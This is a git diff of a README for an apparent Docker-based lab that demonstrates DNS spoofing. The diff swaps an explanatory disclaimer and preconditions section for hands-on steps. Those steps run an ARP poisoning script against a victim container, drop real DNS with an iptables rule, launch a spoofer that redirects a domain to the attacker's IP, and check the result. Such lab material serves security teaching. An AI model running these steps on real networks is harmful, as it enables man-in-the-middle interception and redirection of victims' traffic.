@@ -219,37 +219,121 @@ graph TD
     style Attacker fill:#f8d7da,stroke:#dc3545,stroke-width:2px,color:#333
     style Internet fill:#e2e3e5,stroke:#6c757d,color:#333
 ```
-# DNS Spoofing
+## How to Test DNS Spoofing
 
-> **Disclaimer:** This code and documentation are for educational purposes only. 
-> DNS Spoofing is illegal if used on networks without explicit permission. 
-> This project demonstrates how DNS trust can be abused and helps understand core network security vulnerabilities.
+Follow these steps to set up the environment, launch the DNS Spoofing attack, and verify the results.
 
-## Overview
-This tool performs a DNS Spoofing (DNS Cache Poisoning) attack by sending forged DNS responses to a target. 
-The goal is to trick a **Client** or **DNS Resolver** into accepting a fake DNS record, causing the victim to be redirected to an **attacker-controlled IP address** instead of the legitimate server.  
-Once the spoofed entry is cached, all future requests for the targeted domain will resolve to the attacker’s machine until the cache expires.
+### 1. Setup & Start Environment
+Run the following command to build the Docker image and start the Attacker and Victim containers in the background.
 
-## Preconditions
-For DNS spoofing to work successfully, the following conditions must be met:
+```bash
+docker-compose up -d --build
+```
 
-1. **Unauthenticated DNS (No DNSSEC):**  
-   The DNS resolver must not validate DNSSEC signatures. Without DNSSEC, DNS responses are not cryptographically verified and can be forged.
+### 2. Prepare the Attack (Terminal 1 & 2)
+DNS Spoofing relies on **ARP Poisoning** to intercept traffic and **iptables** to block the real DNS response. This requires multiple terminals.
 
-2. **Plaintext DNS Traffic:**  
-   The victim must be using standard DNS over UDP port 53.  
-   *Encrypted DNS (DoH/DoT) prevents this attack.*
+#### A. Enable ARP Poisoning (Terminal 1)
+Open a terminal inside the **Attacker** container and run the ARP poisoning script.
 
-3. **Ability to Send or Inject Forged DNS Responses:**  
-   The attacker must be able to deliver spoofed packets that appear to come from an authoritative DNS server.  
-   This is typically possible when the attacker is:
-   * on the same LAN,  
-   * performing ARP spoofing, or  
-   * on a network that allows IP spoofing.
+```bash
+# 1. Enter the attacker container
+docker exec -it attacker bash
 
-4. **Caching Resolver in Use:**  
-   The target must rely on a DNS resolver that caches responses. A poisoned entry in the cache will impact all clients that query that resolver.
+# 2. Run the ARP Poisoning script
+# Usage: python main.py arp_pois [target_ip] [gateway_ip] [interface]
+python main.py arp_pois 172.25.0.10 172.25.0.1 eth0
+```
+> **Note:** The script will run continuously. Keep this terminal open to maintain the MITM position.
 
-5. **Weak or Predictable DNS Entropy:**  
-   Successful spoofing requires guessing DNS transaction IDs and source ports.  
-   Resolvers with weak randomization are significantly more vulnerable.
+#### B. Block Real DNS (Terminal 2)
+To win the race condition against Google's DNS (8.8.8.8), we must block the real packet forwarding.
+
+```bash
+# Run this command ONCE in a new terminal (Host machine)
+docker exec attacker iptables -I FORWARD -p udp --dport 53 -j DROP
+```
+
+### 3. Launch DNS Spoofing (Terminal 2)
+In the same terminal where you ran the iptables command (or a new one), start the DNS Spoofer.
+
+```bash
+# 1. Enter the attacker container (if not already inside)
+docker exec -it attacker bash
+
+# 2. Run the DNS Spoofing script
+# Usage: python main.py dns_spoof [target_domain] [fake_ip] [interface]
+python main.py dns_spoof wow.hacker.test 172.25.0.20 eth0
+```
+> **Note:** The script will wait silently (`Listening...`) until the victim makes a request.
+
+### 4. Verify the Attack (Proof of Concept)
+Open a **new terminal window (Terminal 3)** to check if the attack is working as intended.
+
+#### A. Check DNS Resolution (The Lie)
+Check if the **Victim's** DNS query resolves to the fake IP.
+
+```bash
+# Ask the Victim to find the target domain
+docker exec victim nslookup wow.hacker.test 8.8.8.8
+```
+**Success Criteria:**
+1.  Look at the `Address` field in the output.
+2.  Compare it to the Attacker's IP (`172.25.0.20`) and the real DNS Server (`8.8.8.8`).
+3.  If the **Address** shows **`172.25.0.20`**, the victim has accepted the spoofed record.
+
+#### B. Check Packet Delivery (Connectivity)
+Verify if the victim actually tries to connect to the Attacker instead of the real server.
+
+```bash
+# Ping the target domain from the Victim container
+docker exec victim ping -c 2 wow.hacker.test
+```
+**Success Criteria:**
+* You should see `PING wow.hacker.test (172.25.0.20)...`.
+* If you see `Name does not resolve` or the real public IP, check if the **iptables** rule from step 2-B is active.
+
+### 5. Cleanup
+To stop the attack and remove all containers and networks:
+
+1.  Press `Ctrl + C` in Terminals 1 and 2 to stop the scripts.
+2.  Run the following command in your main terminal:
+
+```bash
+docker-compose down
+```
+
+## Network Topology Diagram(DNS spoffing)
+```mermaid
+graph TD
+    %% Node Definitions
+    RealDNS((Internet WAN<br>Real DNS Server: 8.8.8.8))
+
+    %% Subgraph: Docker Internal Bridge Network
+    subgraph LocalNet ["🔒 User-Defined Bridge Network (172.25.0.0/16)"]
+        style LocalNet fill:#f4f7f6,stroke:#333,stroke-width:2px,color:#2c3e50
+        
+        %% Nodes
+        Gateway["Gateway (172.25.0.1)<br>Packet Forwarding"]
+        Victim["Target (Victim)<br>IP: 172.25.0.10"]
+        Attacker["Adversary (Attacker)<br>IP: 172.25.0.20<br>Role: DNS Spoofer"]
+
+        %% Flow: Victim Request
+        Victim -- "1. DNS Query: 'Where is google.com?'<br>(Dest: 8.8.8.8)" --> Attacker
+
+        %% Flow: Attacker Action (Block & Spoof)
+        Attacker -- "2. 🛑 BLOCK Real Request<br>(iptables DROP)" --> Gateway
+        Attacker -- "3. 💀 FAKE Response: 'It is 172.25.0.20'<br>(Scapy Injection)" --> Victim
+    end
+
+    %% Edge Connection (Blocked path)
+    Gateway -.-> |"❌ Traffic Dropped by Attacker"| RealDNS
+
+    %% Styling
+    style Gateway fill:#fff3cd,stroke:#ffc107,stroke-width:2px,color:#333
+    style Victim fill:#d1e7dd,stroke:#198754,stroke-width:2px,color:#333
+    style Attacker fill:#f8d7da,stroke:#dc3545,stroke-width:2px,color:#333
+    style RealDNS fill:#e2e3e5,stroke:#6c757d,color:#333
+
+    %% Link Styling
+    linkStyle 3 stroke:#dc3545,stroke-width:3px,color:red;
